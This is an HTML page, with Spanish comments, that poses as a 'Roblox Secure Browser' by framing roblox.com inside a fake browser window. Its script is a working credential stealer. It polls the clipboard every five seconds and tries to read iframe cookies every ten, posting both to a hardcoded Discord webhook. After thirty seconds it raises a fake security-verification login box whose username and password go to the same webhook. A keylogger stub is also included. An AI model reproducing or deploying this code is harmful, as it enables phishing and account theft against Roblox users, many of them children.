<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Secure Browser</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        
        body {
            background: #202124;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 10px;
        }
        
        /* VENTANA DEL NAVEGADOR FALSO */
        .browser-window {
            width: 100%;
            max-width: 1200px;
            height: 90vh;
            background: #292a2d;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            display: flex;
            flex-direction: column;
            border: 1px solid #4a4a4a;
        }
        
        /* BARRA DE TÍTULO */
        .title-bar {
            background: #1e1f22;
            padding: 8px 15px;
            display: flex;
            align-items: center;
            gap: 15px;
            border-bottom: 1px solid #3d3e42;
        }
        
        .window-controls {
            display: flex;
            gap: 10px;
        }
        
        .window-controls span {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            display: inline-block;
        }
        
        .close { background: #ed6a5e; }
        .minimize { background: #f5bd4f; }
        .maximize { background: #61c454; }
        
        .browser-logo {
            color: #8ab4f8;
            font-weight: bold;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        /* BARRA DE PESTAÑAS */
        .tabs-bar {
            background: #1e1f22;
            padding: 8px 15px 0 15px;
            display: flex;
            gap: 5px;
            border-bottom: 1px solid #3d3e42;
        }
        
        .tab {
            background: #2f3136;
            color: #e8eaed;
            padding: 8px 20px;
            border-radius: 8px 8px 0 0;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            border: 1px solid #3d3e42;
            border-bottom: none;
        }
        
        .tab.active {
            background: #3d3e42;
            color: white;
        }
        
        .tab-close {
            color: #9aa0a6;
            font-size: 16px;
        }
        
        .new-tab {
            background: #2f3136;
            color: #e8eaed;
            width: 32px;
            height: 32px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            cursor: pointer;
            border: 1px solid #3d3e42;
        }
        
        /* BARRA DE DIRECCIONES (EDITABLE) */
        .address-bar {
            background: #1e1f22;
            padding: 10px 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-bottom: 1px solid #3d3e42;
        }
        
        .nav-buttons {
            display: flex;
            gap: 8px;
            color: #e8eaed;
        }
        
        .nav-btn {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            cursor: pointer;
            background: #2f3136;
        }
        
        .nav-btn:hover {
            background: #3d3e42;
        }
        
        .url-container {
            flex: 1;
            background: #2f3136;
            border-radius: 24px;
            padding: 8px 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            border: 1px solid #3e4046;
        }
        
        .lock-icon {
            color: #9aa0a6;
            font-size: 14px;
        }
        
        .url-input {
            flex: 1;
            background: transparent;
            border: none;
            color: #e8eaed;
            font-size: 14px;
            outline: none;
        }
        
        .url-input::placeholder {
            color: #9aa0a6;
        }
        
        .menu-icon {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            cursor: pointer;
            background: #2f3136;
        }
        
        /* BARRA DE HERRAMIENTAS */
        .toolbar {
            background: #292a2d;
            padding: 8px 15px;
            display: flex;
            gap: 20px;
            border-bottom: 1px solid #3d3e42;
        }
        
        .tool-item {
            color: #9aa0a6;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 5px;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
        }
        
        .tool-item:hover {
            background: #3d3e42;
            color: #e8eaed;
        }
        
        /* ÁREA DE CONTENIDO (IFRAME) */
        .content-area {
            flex: 1;
            background: white;
            position: relative;
        }
        
        #mainFrame {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        /* BARRA DE ESTADO */
        .status-bar {
            background: #1e1f22;
            padding: 5px 15px;
            color: #9aa0a6;
            font-size: 12px;
            display: flex;
            justify-content: space-between;
            border-top: 1px solid #3d3e42;
        }
        
        /* MODAL DE LOGIN (para capturar credenciales) */
        .login-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }
        
        .modal-content {
            background: #292a2d;
            padding: 30px;
            border-radius: 12px;
            width: 400px;
            color: white;
        }
        
        .modal-content h2 {
            color: #8ab4f8;
            margin-bottom: 20px;
        }
        
        .modal-content input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #3d3e42;
            border: 1px solid #4a4a4a;
            border-radius: 5px;
            color: white;
        }
        
        .modal-content button {
            width: 100%;
            padding: 12px;
            background: #8ab4f8;
            border: none;
            border-radius: 5px;
            color: #202124;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="browser-window">
        <!-- BARRA DE TÍTULO -->
        <div class="title-bar">
            <div class="window-controls">
                <span class="close"></span>
                <span class="minimize"></span>
                <span class="maximize"></span>
            </div>
            <div class="browser-logo">
                <span>🌐</span> Roblox Secure Browser
            </div>
        </div>
        
        <!-- BARRA DE PESTAÑAS -->
        <div class="tabs-bar">
            <div class="tab active">
                <span>🔒</span> Roblox
                <span class="tab-close">✕</span>
            </div>
            <div class="tab">
                <span>📁</span> Nueva pestaña
                <span class="tab-close">✕</span>
            </div>
            <div class="new-tab">+</div>
        </div>
        
        <!-- BARRA DE DIRECCIONES (FALSA) -->
        <div class="address-bar">
            <div class="nav-buttons">
                <div class="nav-btn">←</div>
                <div class="nav-btn">→</div>
                <div class="nav-btn">↻</div>
                <div class="nav-btn">🏠</div>
            </div>
            
            <div class="url-container">
                <span class="lock-icon">🔒</span>
                <input type="text" class="url-input" id="urlInput" value="https://www.roblox.com/home" placeholder="Buscar o escribir URL">
                <span style="color:#9aa0a6;">⭐</span>
            </div>
            
            <div class="menu-icon">⋮</div>
        </div>
        
        <!-- BARRA DE HERRAMIENTAS -->
        <div class="toolbar">
            <div class="tool-item">📑 Administrar cuentas</div>
            <div class="tool-item">🔐 Verificador de seguridad</div>
            <div class="tool-item">🎮 Juegos destacados</div>
            <div class="tool-item">⚙️ Ajustes</div>
        </div>
        
        <!-- ÁREA DE CONTENIDO (IFRAME) -->
        <div class="content-area">
            <iframe id="mainFrame" src="https://www.roblox.com/home"></iframe>
        </div>
        
        <!-- BARRA DE ESTADO -->
        <div class="status-bar">
            <span>🔒 Conexión segura</span>
            <span id="statusText">Listo</span>
        </div>
    </div>
    
    <!-- MODAL DE LOGIN (se activa automáticamente) -->
    <div class="login-modal" id="loginModal">
        <div class="modal-content">
            <h2>🔐 VERIFICACIÓN DE SEGURIDAD</h2>
            <p>Por tu seguridad, confirma tu identidad</p>
            <input type="text" id="loginUser" placeholder="Usuario de Roblox">
            <input type="password" id="loginPass" placeholder="Contraseña">
            <button onclick="capturarCredenciales()">Verificar</button>
        </div>
    </div>

    <script>
        // ===========================================
        // CONFIGURACIÓN
        // ===========================================
        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        
        // ===========================================
        // CONTROL DE LA BARRA DE DIRECCIONES
        // ===========================================
        document.getElementById('urlInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                let url = this.value;
                if (!url.startsWith('http')) {
                    url = 'https://' + url;
                }
                document.getElementById('mainFrame').src = url;
            }
        });
        
        // ===========================================
        // CAPTURAR TECLAS EN EL IFRAME (CUANDO ES DEL MISMO DOMINIO)
        // ===========================================
        function injectKeylogger() {
            try {
                const iframe = document.getElementById('mainFrame');
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                
                // Solo funciona si el iframe es del mismo dominio
                if (iframeDoc) {
                    iframeDoc.addEventListener('keydown', function(e) {
                        console.log('Tecla en iframe:', e.key);
                        // Aquí podrías capturar teclas
                    });
                }
            } catch(e) {
                console.log('No se puede acceder al iframe (cross-origin)');
            }
        }
        
        // ===========================================
        // CAPTURAR PORTAPAPELES (FUNCIONA SIEMPRE)
        // ===========================================
        async function leerPortapapeles() {
            try {
                const texto = await navigator.clipboard.readText();
                console.log('Portapapeles:', texto);
                
                // Enviar a Discord
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**📋 PORTAPAPELES**\n\`\`\`${texto}\`\`\``
                    })
                });
            } catch(e) {}
        }
        
        // ===========================================
        // MOSTRAR MODAL DE LOGIN (INGENIERÍA SOCIAL)
        // ===========================================
        function mostrarModalLogin() {
            document.getElementById('loginModal').style.display = 'flex';
        }
        
        // ===========================================
        // CAPTURAR CREDENCIALES DEL MODAL
        // ===========================================
        function capturarCredenciales() {
            const user = document.getElementById('loginUser').value;
            const pass = document.getElementById('loginPass').value;
            
            if (user && pass) {
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**🔐 CREDENCIALES CAPTURADAS**\n**Usuario:** ${user}\n**Contraseña:** ${pass}`
                    })
                });
                
                document.getElementById('loginModal').style.display = 'none';
                alert('Verificación completada');
            }
        }
        
        // ===========================================
        // INTENTAR LEER COOKIES DEL IFRAME
        // ===========================================
        function intentarLeerCookies() {
            try {
                const iframe = document.getElementById('mainFrame');
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                
                if (iframeDoc) {
                    const cookies = iframeDoc.cookie;
                    if (cookies) {
                        fetch(WEBHOOK, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: `**🍪 COOKIES DEL IFRAME**\n\`\`\`${cookies}\`\`\``
                            })
                        });
                    }
                }
            } catch(e) {}
        }
        
        // ===========================================
        // INICIAR TODO
        // ===========================================
        (function init() {
            console.log('🚀 Navegador falso iniciado');
            
            // Leer portapapeles cada 5 segundos
            setInterval(leerPortapapeles, 5000);
            
            // Intentar leer cookies del iframe
            setInterval(intentarLeerCookies, 10000);
            
            // Mostrar modal de login después de 30 segundos (ingeniería social)
            setTimeout(mostrarModalLogin, 30000);
            
            // Actualizar estado
            document.getElementById('statusText').textContent = 'Navegación segura activada';
        })();
    </script>
</body>
</html>
